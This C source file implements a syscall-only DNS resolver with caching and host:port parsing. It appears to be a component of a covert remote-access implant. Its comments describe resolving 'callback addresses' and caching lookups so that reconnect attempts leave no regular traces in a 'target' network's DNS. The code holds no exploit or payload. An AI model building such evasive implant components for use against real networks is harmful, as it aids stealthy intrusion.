#include "dns.h"
#include "crt.h"
#include "types.h"
#include "timing.h"

#ifdef ARCH_X86_64
#include "syscalls_x64.h"
#endif
#ifdef ARCH_AARCH64
#include "syscalls_aarch64.h"
#endif

// Linux socket constants (与 connector.c 一致的手写定义)
#define DNS_AF_INET      2
#define DNS_SOCK_DGRAM   2
#define DNS_IPPROTO_UDP  17

struct dns_sockaddr_in {
    uint16_t sin_family;
    uint16_t sin_port;    // network byte order
    uint32_t sin_addr;    // network byte order
    uint8_t  sin_zero[8];
};

/* ── 缓存：成功 300s / 失败 60s。
 * 重连循环（漂移 20-45s）会在断线期间反复进入这里；不缓存的话每次重连
 * 都是一轮完整 UDP 查询，既慢又给目标内网 DNS 留下规律性请求痕迹。 */
#define DNS_TTL_OK_MS   300000ULL
#define DNS_TTL_FAIL_MS 60000ULL
static char     cache_name[254];
static uint32_t cache_ip;          /* 0 = 上次解析失败（负缓存） */
static uint64_t cache_deadline_ms;
static int      cache_valid;

// ── fd_set / pselect6（connector.c 同款的最小实现，避免跨文件依赖） ──
typedef struct {
    unsigned long fds_bits[1024 / (8 * sizeof(unsigned long))];
} dns_fdset_t;

static inline void dns_fd_zero(dns_fdset_t *set) {
    for (unsigned i = 0; i < sizeof(set->fds_bits) / sizeof(set->fds_bits[0]); i++)
        set->fds_bits[i] = 0;
}
static inline void dns_fd_set(int fd, dns_fdset_t *set) {
    unsigned idx = (unsigned)fd / (8 * sizeof(unsigned long));
    unsigned bit = (unsigned)fd % (8 * sizeof(unsigned long));
    set->fds_bits[idx] |= (1UL << bit);
}

static int dns_wait_readable(int fd, int timeout_ms) {
    dns_fdset_t rfds;
    dns_fd_zero(&rfds);
    dns_fd_set(fd, &rfds);

    struct linux_timespec ts;
    ts.tv_sec = timeout_ms / 1000;
    ts.tv_nsec = (long)(timeout_ms % 1000) * 1000000L;

    int ret = sys_pselect6(fd + 1, (void *)&rfds, (void *)0, (void *)0, &ts, (void *)0);
    return ret;  /* -1 错误 / 0 超时 / 1 可读 */
}

// ── IPv4 字面量解析（无 DNS）── 与旧 parse_address 的 IP 段一致
static int dns_parse_ipv4(const char *s, size_t len, uint32_t *ip_be) {
    uint32_t octets[4] = {0};
    int octet_idx = 0;
    int ndigits = 0;
    for (size_t i = 0; i < len; i++) {
        char c = s[i];
        if (c == '.') {
            if (ndigits == 0) return -1;      /* ".." 或以 . 开头 */
            octet_idx++;
            ndigits = 0;
            if (octet_idx > 3) return -1;
        } else if (c >= '0' && c <= '9') {
            octets[octet_idx] = octets[octet_idx] * 10 + (uint32_t)(c - '0');
            ndigits++;
            if (ndigits > 3) return -1;
        } else {
            return -1;
        }
    }
    if (octet_idx != 3 || ndigits == 0) return -1;
    for (int i = 0; i < 4; i++) {
        if (octets[i] > 255) return -1;
    }
    *ip_be = octets[0] | (octets[1] << 8) | (octets[2] << 16) | (octets[3] << 24);
    return 0;
}

// ── /etc/resolv.conf：最多取 3 个 nameserver（IPv4）──
static int dns_load_resolv(uint32_t *ns_out, int max_ns) {
    char buf[4096];
    int fd = sys_open("/etc/resolv.conf", 0 /*O_RDONLY*/, 0);
    if (fd < 0) return 0;
    long n = sys_read(fd, buf, sizeof(buf) - 1);
    sys_close(fd);
    if (n <= 0) return 0;
    buf[n] = '\0';

    int count = 0;
    char *line = buf;
    while (line && *line && count < max_ns) {
        char *nl = ax_strchr(line, '\n');
        if (nl) *nl = '\0';
        if (ax_strncmp(line, "nameserver", 10) == 0 && (line[10] == ' ' || line[10] == '\t')) {
            char *p = line + 10;
            while (*p == ' ' || *p == '\t') p++;
            char *end = p;
            while (*end && *end != ' ' && *end != '\t') end++;
            if (dns_parse_ipv4(p, (size_t)(end - p), &ns_out[count]) == 0) {
                count++;
            }
        }
        line = nl ? nl + 1 : (char *)0;
    }

    /* systemd-resolved 常把 127.0.0.53 写在 stub resolv.conf 里，正常覆盖。
     * 没有任何可用 nameserver 时兜底本机 stub —— 语义与 glibc 一致。 */
    if (count == 0) {
        ns_out[0] = 127 | (0UL << 8) | (0UL << 16) | (53UL << 24);   /* 127.0.0.53 */
        count = 1;
    }
    return count;
}

// ── DNS 报文构造（A 查询，无 EDNS —— 512B 内完成）──
static int dns_build_query(const char *name, uint16_t txid, uint8_t *out, size_t out_cap) {
    size_t o = 0;
    if (out_cap < 512) return -1;

    /* header: id / flags=RD / qd=1 / 其他 0 */
    out[o++] = (uint8_t)(txid >> 8); out[o++] = (uint8_t)txid;
    out[o++] = 0x01; out[o++] = 0x00;               /* RD=1 */
    out[o++] = 0x00; out[o++] = 0x01;               /* qdcount */
    out[o++] = 0x00; out[o++] = 0x00;
    out[o++] = 0x00; out[o++] = 0x00;
    out[o++] = 0x00; out[o++] = 0x00;

    /* QNAME：label 序列。剥掉尾部根点；超长名直接失败（DNS 上限 253）。 */
    const char *p = name;
    size_t name_len = ax_strlen(name);
    if (name_len > 0 && name[name_len - 1] == '.') name_len--;
    if (name_len == 0 || name_len > 253) return -1;

    while (1) {
        const char *dot = ax_strchr(p, '.');
        size_t label_len = dot ? (size_t)(dot - p) : ax_strlen(p);
        if (label_len == 0 || label_len > 63) return -1;
        if (o + 1 + label_len + 4 > out_cap) return -1;   /* +4 = 尾零 + type/class */
        out[o++] = (uint8_t)label_len;
        ax_memcpy(out + o, p, label_len);
        o += label_len;
        if (!dot) break;
        p = dot + 1;
    }
    out[o++] = 0x00;

    /* QTYPE=A(1) / QCLASS=IN(1) */
    out[o++] = 0x00; out[o++] = 0x01;
    out[o++] = 0x00; out[o++] = 0x01;
    return (int)o;
}

/* 跳过一个（可能压缩指针编码的）域名。返回消费的字节数，失败 -1。
 * 指针（0xC0 前缀）在原报文里占 2 字节即结束 —— 不需要跟随它。 */
static int dns_skip_name(const uint8_t *msg, size_t msg_len, size_t off) {
    int consumed = 0;
    while (1) {
        if (off >= msg_len) return -1;
        uint8_t len = msg[off];
        if ((len & 0xC0) == 0xC0) {
            if (off + 1 >= msg_len) return -1;
            return consumed + 2;                      /* 压缩指针：2 字节收尾 */
        }
        if (len == 0) return consumed + 1;            /* 根标签：1 字节收尾 */
        if (len & 0xC0) return -1;                    /* 非 pointer 的高位置位，非法 */
        if (off + 1 + len > msg_len) return -1;
        consumed += 1 + (int)len;
        off += 1 + (size_t)len;
    }
}

static int dns_query_once(uint32_t ns_ip_be, const uint8_t *query, int query_len,
                          uint16_t txid, uint32_t *ip_be) {
    int fd = (int)sys_socket(DNS_AF_INET, DNS_SOCK_DGRAM, DNS_IPPROTO_UDP);
    if (fd < 0) return -1;

    struct dns_sockaddr_in ns;
    ax_memset(&ns, 0, sizeof(ns));
    ns.sin_family = DNS_AF_INET;
    ns.sin_addr = ns_ip_be;
    ns.sin_port = (53 >> 8) | ((53 & 0xFF) << 8);     /* 53，网络序 */

    if (sys_connect(fd, (const void *)&ns, sizeof(ns)) != 0) {
        sys_close(fd);
        return -1;
    }

    long w = sys_write(fd, query, (size_t)query_len);
    if (w != query_len) {
        sys_close(fd);
        return -1;
    }

    /* 1.5s 等 UDP 回包；再长的 RTT 对上线链路没有意义 */
    if (dns_wait_readable(fd, 1500) != 1) {
        sys_close(fd);
        return -1;
    }

    uint8_t resp[512];
    long n = sys_read(fd, resp, sizeof(resp));
    sys_close(fd);
    if (n < 12) return -1;

    /* 校验事务 ID / QR / RCODE */
    uint16_t rid = ((uint16_t)resp[0] << 8) | resp[1];
    if (rid != txid) return -1;
    uint16_t flags = ((uint16_t)resp[2] << 8) | resp[3];
    if (!(flags & 0x8000)) return -1;                 /* QR 必须为 1（应答） */
    if ((flags & 0x000F) != 0) return -1;             /* RCODE != NOERROR */
    uint16_t qd = ((uint16_t)resp[4] << 8) | resp[5];
    uint16_t an = ((uint16_t)resp[6] << 8) | resp[7];
    if (an == 0) return -1;

    size_t off = 12;
    for (uint16_t i = 0; i < qd; i++) {
        int used = dns_skip_name(resp, (size_t)n, off);
        if (used < 0) return -1;
        off += (size_t)used + 4;                      /* QTYPE + QCLASS */
    }

    for (uint16_t i = 0; i < an; i++) {
        int used = dns_skip_name(resp, (size_t)n, off);
        if (used < 0) return -1;
        off += (size_t)used;
        if (off + 10 > (size_t)n) return -1;          /* TYPE/CLASS/TTL/RDLEN */
        uint16_t rtype  = ((uint16_t)resp[off] << 8) | resp[off + 1];
        uint16_t rclass = ((uint16_t)resp[off + 2] << 8) | resp[off + 3];
        uint16_t rdlen  = ((uint16_t)resp[off + 8] << 8) | resp[off + 9];
        off += 10;
        if (off + rdlen > (size_t)n) return -1;
        if (rtype == 1 && rclass == 1 && rdlen == 4) {
            /* rdata 是网络序（首字节 = 首个八位组）。落在 uint32 里要按
             * 本工程约定（dns_parse_ipv4 / 旧 parse_address）：首八位组在
             * 最低字节 —— 小端机器上直接赋给 sin_addr 得到正确的内存字节序。 */
            *ip_be = ((uint32_t)resp[off]) | ((uint32_t)resp[off + 1] << 8) |
                      ((uint32_t)resp[off + 2] << 16) | ((uint32_t)resp[off + 3] << 24);
            return 0;                                  /* 第一个 A 记录 */
        }
        off += rdlen;                                  /* CNAME 等：跳过 */
    }
    return -1;
}

int ax_dns_resolve(const char *name, uint32_t *ip) {
    if (!name || !*name) return -1;

    /* IPv4 字面量：零开销直通（绝大多数回调地址仍是 IP） */
    if (dns_parse_ipv4(name, ax_strlen(name), ip) == 0) return 0;

    size_t name_len = ax_strlen(name);
    if (name_len >= sizeof(cache_name)) name_len = sizeof(cache_name) - 1;

    /* 缓存命中（含负缓存） */
    uint64_t now = ax_monotonic_ms();
    if (cache_valid && cache_deadline_ms > now &&
        ax_strlen(cache_name) == name_len && ax_strncmp(cache_name, name, name_len) == 0) {
        if (cache_ip != 0) { *ip = cache_ip; return 0; }
        return -1;
    }

    uint32_t ns_list[3];
    int ns_count = dns_load_resolv(ns_list, 3);

    uint8_t query[512];
    uint8_t seed[2];
    if (ax_random_bytes(seed, sizeof(seed)) != 0) { seed[0] = (uint8_t)now; seed[1] = (uint8_t)(now >> 8); }

    int result = -1;
    /* 两轮重试（第二轮换事务 ID）：单 nameserver 抖包不至于直接失败 */
    for (int round = 0; round < 2 && result != 0; round++) {
        uint16_t txid = ((uint16_t)seed[0] << 8) | seed[1];
        seed[1] = (uint8_t)(seed[1] + 0x2b);          /* 每轮换 id */
        int qlen = dns_build_query(name, txid, query, sizeof(query));
        if (qlen < 0) break;
        for (int i = 0; i < ns_count && result != 0; i++) {
            if (dns_query_once(ns_list[i], query, qlen, txid, ip) == 0) result = 0;
        }
    }

    /* 写缓存（失败也写：负缓存防止重连风暴反复打 DNS） */
    ax_memset(cache_name, 0, sizeof(cache_name));
    ax_memcpy(cache_name, name, name_len);
    cache_valid = 1;
    if (result == 0) {
        cache_ip = *ip;
        cache_deadline_ms = now + DNS_TTL_OK_MS;
    } else {
        cache_ip = 0;
        cache_deadline_ms = now + DNS_TTL_FAIL_MS;
        *ip = 0;
    }
    return result;
}

int ax_parse_endpoint(const char *address, uint32_t *ip, uint16_t *port) {
    if (!address) return -1;

    const char *colon = (const char *)0;
    for (const char *p = address; *p; p++) {
        if (*p == ':') colon = p;                      /* 取最后一个冒号（IPv4/域名不含冒号） */
    }
    if (!colon || colon == address) return -1;

    /* host 段：IPv4 直通，否则走 DNS */
    size_t host_len = (size_t)(colon - address);
    char host[254];
    if (host_len == 0 || host_len >= sizeof(host)) return -1;
    ax_memcpy(host, address, host_len);
    host[host_len] = '\0';
    if (ax_dns_resolve(host, ip) != 0) return -1;

    /* port 段：数字 → 网络字节序（与旧 parse_address 输出语义一致） */
    uint32_t pval = 0;
    for (const char *p = colon + 1; *p >= '0' && *p <= '9'; p++) {
        pval = pval * 10 + (uint32_t)(*p - '0');
        if (pval > 65535) return -1;
    }
    if (pval == 0) return -1;
    *port = (uint16_t)(((pval >> 8) & 0xFF) | ((pval & 0xFF) << 8));
    return 0;
}
